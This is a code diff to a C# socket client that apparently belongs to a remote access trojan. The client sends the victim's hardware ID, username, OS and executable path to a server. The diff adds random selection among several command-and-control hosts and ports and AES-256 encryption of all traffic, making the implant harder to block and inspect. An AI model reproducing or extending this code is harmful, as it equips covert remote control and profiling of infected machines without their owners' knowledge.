@@ -35,7 +35,8 @@ namespace Client.Sockets
                     ReceiveTimeout = -1,
                     SendTimeout = -1,
                 };
-                Client.Connect(Settings.IP, Convert.ToInt32(Settings.Port));
+                Client.Connect(Convert.ToString(Settings.Host.Split(',')[new Random().Next(Settings.Host.Split(',').Length)]), 
+                    Convert.ToInt32(Settings.Ports.Split(',')[new Random().Next(Settings.Ports.Split(',').Length)]));
                 Debug.WriteLine("Connected!");
                 Connected = true;
                 Buffer = new byte[1];
@@ -77,7 +78,8 @@ namespace Client.Sockets
             msgpack.ForcePathObject("Packet").AsString = "ClientInfo";
             msgpack.ForcePathObject("HWID").AsString = HWID();
             msgpack.ForcePathObject("User").AsString = Environment.UserName.ToString();
-            msgpack.ForcePathObject("OS").AsString = new ComputerInfo().OSFullName.ToString().Replace("Microsoft", null) + " " + Environment.Is64BitOperatingSystem.ToString().Replace("True", "64bit").Replace("False", "32bit");
+            msgpack.ForcePathObject("OS").AsString = new ComputerInfo().OSFullName.ToString().Replace("Microsoft", null) + " " + 
+                Environment.Is64BitOperatingSystem.ToString().Replace("True", "64bit").Replace("False", "32bit");
             msgpack.ForcePathObject("Path").AsString = Process.GetCurrentProcess().MainModule.FileName;
             msgpack.ForcePathObject("Version").AsString = Settings.Version;
             return msgpack.Encode2Bytes();
@@ -137,7 +139,7 @@ namespace Client.Sockets
                         MS.Write(Buffer, 0, Recevied);
                         if (MS.Length == Buffersize)
                         {
-                            ThreadPool.QueueUserWorkItem(HandlePacket.Read, MS.ToArray());
+                            ThreadPool.QueueUserWorkItem(HandlePacket.Read, Settings.aes256.Decrypt(MS.ToArray()));
                             MS.Dispose();
                             MS = new MemoryStream();
                             Buffer = new byte[1];
@@ -162,7 +164,7 @@ namespace Client.Sockets
             }
         }
 
-        public static void BeginSend(byte[] buffer)
+        public static void BeginSend(byte[] Msg)
         {
             lock (SendSync)
             {
@@ -176,6 +178,7 @@ namespace Client.Sockets
                 {
                     using (MemoryStream MS = new MemoryStream())
                     {
+                        byte[] buffer = Settings.aes256.Encrypt(Msg);
                         byte[] buffersize = Encoding.UTF8.GetBytes(buffer.Length.ToString() + (char)0);
                         MS.Write(buffersize, 0, buffersize.Length);
                         MS.Write(buffer, 0, buffer.Length);
